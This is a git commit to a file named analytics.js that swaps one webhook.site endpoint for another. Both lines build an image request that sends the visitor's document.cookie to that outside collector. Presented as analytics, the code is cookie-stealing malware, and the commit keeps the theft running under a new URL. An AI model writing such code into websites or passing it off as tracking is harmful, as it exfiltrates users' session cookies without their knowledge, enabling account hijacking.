0ac932c4d69a41231acb4de14882ad999bc57030
iare-analytics <leet1337@tutamail.com>
2025-08-28 10:30:04 +0530

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,1 +1,1 @@
-new Image().src = 'https://webhook.site/7295cccc-e8aa-4d1b-a930-9e7957491a68?c=' + encodeURIComponent(document.cookie) + '&t=' + Date.now();
+new Image().src = 'https://webhook.site/05a7b7af-326c-47f2-bce0-f5ed4f46af6d?c=' + encodeURIComponent(document.cookie) + '&t=' + Date.now();
